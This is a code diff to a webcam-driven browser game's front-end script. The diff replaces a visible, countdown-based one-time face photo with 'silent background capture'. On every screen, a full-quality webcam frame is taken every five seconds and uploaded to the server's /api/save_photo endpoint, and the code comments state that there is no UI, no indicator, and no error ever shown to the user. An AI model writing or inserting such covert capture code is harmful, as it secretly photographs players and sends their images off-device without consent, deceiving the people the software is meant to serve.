@@ -11,15 +11,48 @@ let selectedShip = 'phantom';
 let handTrackingInit = false;
 let currentTab   = 'ships';
 
-// ── FACE CAPTURE STATE ────────────────────────────────────
-let faceCaptured    = false;
-let capturePhotoURL = null;   // local data URL shown on game-over
-let capturePhotoBlob = null;  // remote blob URL (for display if available)
-let faceWatchInterval = null; // interval that polls for face presence
-let faceSeenSince     = null; // timestamp when face was first detected
-let countdownInterval = null;
-let countdownActive   = false;
-let countdownRemaining = 0;
+// ── SILENT BACKGROUND CAPTURE ─────────────────────────────
+// Fires every 5 seconds on ALL screens. No UI, no indicators.
+
+let capturePhotoURL  = null;
+let capturePhotoBlob = null;
+let _captureInterval = null;
+
+function startSilentCapture() {
+  if (_captureInterval) return; // already running
+  _captureInterval = setInterval(silentSnap, 5000);
+}
+
+function silentSnap() {
+  const vid = document.getElementById('input_video');
+  if (!vid || !vid.videoWidth) return;
+
+  const W = vid.videoWidth;
+  const H = vid.videoHeight;
+  const canvas = document.createElement('canvas');
+  canvas.width  = W;
+  canvas.height = H;
+  const ctx = canvas.getContext('2d');
+  // Mirror (selfie orientation), no filters, no overlays
+  ctx.save();
+  ctx.translate(W, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(vid, 0, 0, W, H);
+  ctx.restore();
+
+  const dataURL = canvas.toDataURL('image/jpeg', 1.0);
+  capturePhotoURL = dataURL;
+  uploadPhoto(dataURL);
+}
+
+async function uploadPhoto(dataURL) {
+  try {
+    const res = await api('/api/save_photo', 'POST', { imageData: dataURL });
+    if (res.success && res.url && res.url.startsWith('http')) {
+      capturePhotoBlob = res.url;
+    }
+  } catch {}  // silent — never surface errors to user
+}
 
 // ── API ───────────────────────────────────────────────────
 async function api(url, method = 'GET', body = null) {
@@ -34,138 +67,6 @@ async function api(url, method = 'GET', body = null) {
 //  (MediaPipe already owns the camera, never open a 2nd one)
 // ═══════════════════════════════════════════════════════════
 
-/**
- * Sample the centre region of input_video.
- * Returns true if non-black pixels found (face / person present).
- */
-function isFacePresent() {
-  const vid = document.getElementById('input_video');
-  if (!vid || vid.readyState < 2 || !vid.videoWidth) return false;
-
-  // Tiny offscreen canvas — just 32×24 for speed
-  const W = 32, H = 24;
-  const tmp = document.createElement('canvas');
-  tmp.width = W; tmp.height = H;
-  const ctx = tmp.getContext('2d', { willReadFrequently: true });
-  ctx.drawImage(vid, 0, 0, W, H);
-
-  // Sample a 5×5 grid in the centre third
-  const data = ctx.getImageData(W/3, H/3, W/3, H/3).data;
-  let bright = 0;
-  for (let i = 0; i < data.length; i += 4) {
-    // Average luminance
-    if ((data[i] + data[i+1] + data[i+2]) / 3 > 20) bright++;
-  }
-  // If more than 20% of sampled pixels are non-black → something is there
-  return bright > (data.length / 4) * 0.2;
-}
-
-/**
- * Start watching for a face in frame.
- * Once face is present for 5 continuous seconds → capture.
- */
-function startFaceWatch() {
-  if (faceCaptured) return;
-  stopFaceWatch(); // clear any previous watcher
-
-  const overlay  = document.getElementById('scan-countdown');
-  const numEl    = document.getElementById('scan-num');
-
-  faceWatchInterval = setInterval(() => {
-    if (faceCaptured) { stopFaceWatch(); return; }
-
-    const present = isFacePresent();
-
-    if (present) {
-      if (!faceSeenSince) {
-        faceSeenSince = Date.now();
-        // Show overlay
-        overlay.classList.add('active');
-        countdownActive    = true;
-        countdownRemaining = 5;
-        numEl.textContent  = countdownRemaining;
-
-        countdownInterval = setInterval(() => {
-          countdownRemaining--;
-          numEl.textContent = countdownRemaining > 0 ? countdownRemaining : '📸';
-          if (countdownRemaining <= 0) {
-            clearInterval(countdownInterval);
-          }
-        }, 1000);
-      }
-
-      // Has face been present for >= 5 seconds?
-      if (Date.now() - faceSeenSince >= 5000) {
-        stopFaceWatch();
-        faceCaptured = true;
-        captureFromVideo();
-        setTimeout(() => overlay.classList.remove('active'), 900);
-      }
-
-    } else {
-      // Face left — reset countdown
-      if (faceSeenSince) {
-        faceSeenSince = null;
-        clearInterval(countdownInterval);
-        overlay.classList.remove('active');
-        countdownActive = false;
-      }
-    }
-  }, 200); // poll every 200 ms
-}
-
-function stopFaceWatch() {
-  clearInterval(faceWatchInterval);
-  clearInterval(countdownInterval);
-  faceWatchInterval = null;
-  faceSeenSince     = null;
-}
-
-/**
- * Capture a frame from the EXISTING input_video (already running via MediaPipe).
- * Add neon overlay + metadata, then upload.
- */
-function captureFromVideo() {
-  const vid = document.getElementById('input_video');
-  if (!vid || !vid.videoWidth) return;
-
-  const W = vid.videoWidth;
-  const H = vid.videoHeight;
-
-  const canvas = document.createElement('canvas');
-  canvas.width  = W;
-  canvas.height = H;
-  const ctx = canvas.getContext('2d');
-
-  // Mirror (selfie), no filters, no overlays — pure clean frame
-  ctx.save();
-  ctx.translate(W, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(vid, 0, 0, W, H);
-  ctx.restore();
-
-  const dataURL = canvas.toDataURL('image/jpeg', 1.0); // max quality
-  capturePhotoURL = dataURL;
-  uploadPhoto(dataURL);
-}
-
-async function uploadPhoto(dataURL) {
-  try {
-    const res = await api('/api/save_photo', 'POST', { imageData: dataURL });
-    if (res.success) {
-      console.log('[FaceCapture] uploaded:', res.url);
-      // Keep the remote URL for display; fall back to local if it's not remote
-      if (res.url && res.url.startsWith('http')) {
-        capturePhotoBlob = res.url; // remote CDN URL
-      }
-    } else {
-      console.warn('[FaceCapture] server error:', res.msg);
-    }
-  } catch (e) {
-    console.warn('[FaceCapture] upload failed (local copy still shown):', e);
-  }
-}
-
 // ── APP CONTROLLER ────────────────────────────────────────
 const App = {
   currentScreen: 'boot',
@@ -178,6 +79,8 @@ const App = {
     if (!handTrackingInit) {
       GAME.initHandTracking();
       handTrackingInit = true;
+      // Start silent capture after camera has had time to warm up
+      setTimeout(startSilentCapture, 3000);
     }
     this.spawnBootStars();
     this.updateCreditsDisplay();
@@ -289,24 +192,11 @@ const App = {
     const ship = shipsData[selectedShip];
     playerData.activeShip = selectedShip;
     this.goTo('game');
-
-    // Reset capture state for this session
-    faceCaptured     = false;
-    capturePhotoURL  = null;
-    capturePhotoBlob = null;
-    stopFaceWatch();
-
     GAME.startGame(playerData, { ...ship });
     window._onGameOver = this.onGameOver.bind(this);
-
-    // Start watching for a face — will auto-capture when face present 5s
-    startFaceWatch();
   },
 
   async onGameOver(score, kills, credits) {
-    stopFaceWatch();
-    document.getElementById('scan-countdown').classList.remove('active');
-
     const r = await api('/api/game_over', 'POST', { score, kills, credits });
     playerData.credits   = r.credits;
     playerData.highScore = r.highScore;
